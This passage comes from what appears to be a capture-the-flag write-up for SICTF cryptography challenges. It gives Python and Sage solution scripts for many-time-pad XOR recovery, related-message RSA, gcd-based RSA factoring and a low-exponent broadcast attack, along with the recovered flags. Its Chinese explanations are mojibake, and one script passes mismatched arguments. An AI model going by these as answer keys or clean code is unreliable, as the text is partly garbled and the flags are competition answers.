function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="comment">#know(10, 21, &#x27;y&#x27;)</span></span><br><span class="line"><span class="comment">#know(8, 14, &#x27;n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red,Rdin+ Hood ppomi4e</span></span><br><span class="line"><span class="string">d to obey de mo8her. Thg gr&amp;n</span></span><br><span class="line"><span class="string">dmother liz ou8 in the&quot;woo#s</span></span><br><span class="line"><span class="string">, a half hcu fr#m the vklla e</span></span><br><span class="line"><span class="string">. When Litxl     Re( Riding&quot;Hoo#</span></span><br><span class="line"><span class="string">entered thi ood? a wolf&quot;cam&quot;</span></span><br><span class="line"><span class="string">up to her.,Se d%d not klow 0h</span></span><br><span class="line"><span class="string">nim-l he waq, a)d</span></span><br><span class="line"><span class="string">id #f him.  Goo#</span></span><br><span class="line"><span class="string">day to you   itt e Red Rkdin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>å¯ä»¥å‹‰å¼ºçœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªå°çº¢å¸½çš„æ•…äº‹ï¼Œå¼€å§‹ä¿®å¤å­—ç¬¦ï¼Œå…ˆä¿®å¤ç¬¬ä¸€è¡Œçš„<code>Little Red Riding Hood</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red Riding Hood ppomi4e</span></span><br><span class="line"><span class="string">d to obey her mother. Thg gr&amp;n</span></span><br><span class="line"><span class="string">dmother lived out in the&quot;woo#s</span></span><br><span class="line"><span class="string">, a half hour from the vklla e</span></span><br><span class="line"><span class="string">. When Little Red Riding&quot;Hoo#</span></span><br><span class="line"><span class="string">entered the woods a wolf&quot;cam&quot;</span></span><br><span class="line"><span class="string">up to her. She did not klow 0h</span></span><br><span class="line"><span class="string">at a wicked animal he waq, a)d</span></span><br><span class="line"><span class="string"> was not afraid of him.  Goo#</span></span><br><span class="line"><span class="string">day to you, Little Red Rkdin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>æ¥ç€ä¿®å¤ç¬¬5è¡Œçš„<code>Little Red Riding Hood</code>ï¼Œå³å¯å¾—åˆ°å®Œæ•´çš„æ–‡ç« ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">24</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">28</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Little Red Riding Hood promise</span></span><br><span class="line"><span class="string">d to obey her mother. The gran</span></span><br><span class="line"><span class="string">dmother lived out in the woods</span></span><br><span class="line"><span class="string">, a half hour from the village</span></span><br><span class="line"><span class="string">. When Little Red Riding Hood</span></span><br><span class="line"><span class="string">entered the woods a wolf came</span></span><br><span class="line"><span class="string">up to her. She did not know wh</span></span><br><span class="line"><span class="string">at a wicked animal he was, and</span></span><br><span class="line"><span class="string"> was not afraid of him. &quot;Good</span></span><br><span class="line"><span class="string">day to you, Little Red Riding</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>æœ€åå¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">16</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">24</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">4</span>, <span class="number">28</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))</span></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="ç­¾åˆ°é¢˜æ¥å’¯ï¼"><a href="#ç­¾åˆ°é¢˜æ¥å’¯ï¼" class="headerlink" title="ç­¾åˆ°é¢˜æ¥å’¯ï¼"></a>ç­¾åˆ°é¢˜æ¥å’¯ï¼</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_55631415/article/details/127994843">https://blog.csdn.net/weixin_55631415/article/details/127994843</a></p><ol><li><p>éœ€è¦çˆ†ç ´eï¼Œeçš„èŒƒå›´æ˜¯512åˆ°1024ä¹‹é—´ã€‚</p></li><li><p>sageè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from tqdm import trange</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, e, n</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^e - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">n = <span class="number">18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883</span></span><br><span class="line">c1 = <span class="number">3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520</span></span><br><span class="line">c2 = <span class="number">6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#m1=attack(c1,c2,n,2)</span></span><br><span class="line"><span class="comment">#print(long_to_bytes(int(m1)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">9</span>,<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i)==<span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag=attack(c1,c2,i,e)</span><br><span class="line">    flag=long_to_bytes(<span class="built_in">int</span>(flag))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;SICTF&#123;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h2><p>æ€è·¯æ˜¯å…ˆå°†hint1å’Œhint2é€šåˆ†ç„¶åç›¸å‡æ±‚å‡ºqçš„å€æ•°ï¼Œä¹‹åå†å’Œnæ±‚æœ€å¤§å…¬çº¦æ•°ä»è€Œæ±‚å‡ºqï¼Œä¹‹åå°±æ˜¯æ­£å¸¸çš„rsaè§£æ³•</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line">hint1 = <span class="number">564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line">hint2 = <span class="number">484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line">c = <span class="number">57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>,<span class="number">2</span>**<span class="number">13</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q=gcd(a*hint1-b*hint2,n)</span><br><span class="line">    <span class="keyword">if</span> q!=<span class="number">1</span> <span class="keyword">and</span> q!=n:</span><br><span class="line">        <span class="built_in">print</span>(q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p = n//q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437</span></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h2><p>å‚è€ƒï¼š <a href="https://blog.csdn.net/shuaicenglou3032/article/details/119930783">CTFä¸­çš„RSAå¥—è·¯ä¹‹ä½åŠ å¯†æŒ‡æ•°æ”»å‡»å’Œä½è§£å¯†æŒ‡æ•°æ”»å‡»_KogRowçš„åšå®¢-CSDNåšå®¢</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N // n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="comment"># e, n, c</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">n1 = <span class="number">14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923</span></span><br><span class="line">n2 = <span class="number">16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499</span></span><br><span class="line">n3 = <span class="number">12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681</span></span><br><span class="line">c1 = <span class="number">786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602</span></span><br><span class="line">c2 = <span 